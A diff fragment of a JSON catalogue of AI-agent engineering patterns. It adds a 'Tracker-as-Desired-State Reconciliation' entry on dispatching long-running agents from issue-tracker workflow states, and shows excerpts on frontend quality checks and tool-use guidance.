+    "domains": [
+      "coding",
+      "design",
+      "frontend"
+    ],
+    "updated_at": "2026-08-21",
+    "excerpt": "\n## Problem\nCoding agents can produce frontend code that compiles and passes unit tests while still shipping generic, incomplete, or misleading interfaces. Common failures include missing loading and error states, controls that look interactive but do nothing, token drift, inaccessible focus behavior, and responsive layouts that were never rendered at their target widths. A source-only review cannot reliably detect all of these problems."
   },
   {
     "title": "Rich Feedback Loops > Perfect Prompts",
@@ -4443,6 +4938,61 @@
     "excerpt": "\n## Problem\nAI agents equipped with multiple tools (e.g., shell access, file system operations, web search, custom CLIs) need clear guidance on when, why, and how to use these tools effectively. Simply having tools available doesn't guarantee they will be used appropriately for the task at hand, especially for tools unfamiliar to the base model or specific to a team's workflow."
   },
   {
+    "title": "Tracker-as-Desired-State Reconciliation",
+    "status": "emerging",
+    "authors": [
+      "Serghei Iakovlev (@sergeyklay)"
+    ],
+    "based_on": [
+      "Kubernetes control-plane design principles"
+    ],
+    "category": "Orchestration & Control",
+    "source": "https://github.com/kubernetes/design-proposals-archive/blob/main/architecture/principles.md",
+    "tags": [
+      "orchestration",
+      "reconciliation",
+      "level-triggered",
+      "issue-tracker",
+      "dispatch",
+      "crash-recovery",
+      "idempotency",
+      "human-in-the-loop"
+    ],
+    "slug": "tracker-as-desired-state-reconciliation",
+    "id": "tracker-as-desired-state-reconciliation",
+    "summary": "Derive agent dispatch by re-reading workflow states in the team's issue tracker every tick, keeping only a short-lived claim locally, so missed events, restarts, and human edits all self-heal.",
+    "maturity": "maturing",
+    "complexity": "medium",
+    "impact": "high",
+    "signals": [
+      "Long-lived agent fleet that must survive restarts and redeploys",
+      "Humans and agents need to cancel or re-prioritize the same work item",
+      "The team already runs a tracker that is the social source of truth for work"
+    ],
+    "anti_signals": [
+      "One-shot or interactive sessions where the human is present for the whole run",
+      "Work items that cannot be represented as tickets (per-token, per-request, sub-second)",
+      "Latency budget below the shortest tolerable poll interval"
+    ],
+    "prerequisites": [
+      "Tracker API that can list items by workflow state and transition an item",
+      "Ability to add or designate workflow states for the state contract",
+      "Idempotent side effects keyed by work-item ID"
+    ],
+    "related": [
+      "board-mediated-async-inter-agent-coordination",
+      "signal-driven-agent-activation",
+      "multi-platform-webhook-triggers",
+      "filesystem-based-agent-state"
+    ],
+    "domains": [
+      "coding",
+      "ops"
+    ],
+    "updated_at": "2026-08-11",
+    "excerpt": "\n## Problem\nAn orchestrator that dispatches long-running agents needs to answer two questions continuously: *what work exists*, and *is it still wanted*. Two common answers both fail in production.\n\n**Edge-triggered dispatch.** A webhook or event fires and an agent starts. If the delivery is lost — receiver redeploy, outage, rate limit, a paused queue — the work silently never happens. Nothing is wrong anywhere; there is simply no record that anything should have occurred. Replaying the event stream is not a fix, because a second `issue.assigned` delivery starts a second agent.\n\n**A private queue inside the orchestrator.** Now there are two systems of record. The board says `In Review`; the orchestrator's table says `running`. They drift, and the drift is invisible until someone asks why an agent is still burning tokens on a ticket that was closed yesterday. Worse, the human's natural control gesture — dragging a card — does nothing, so cancellation needs a second control surface that the team does not have open.\n\nBoth failures share a root cause: dispatch is derived from *events about* the work rather than from *the state of* the work. That also leaves crash recovery as bespoke resume logic, and leaves the audit trail in agent logs no one reads instead of on the ticket everyone reads."
+  },
+  {
     "title": "Transitive Vouch-Chain Trust",
     "status": "emerging",
     "authors": [
@@ -4518,7 +5068,7 @@
     "summary": "Route all agent tool calls through a single gateway that handles discovery, authentication, billing, and execution across many heterogeneous providers.",
     "maturity": "maturing",
     "complexity": "medium",
-    "effort": "medium",
+    "effort": "days",
     "impact": "high",
     "signals": [
       "Agent needs 10+ external tools or APIs",
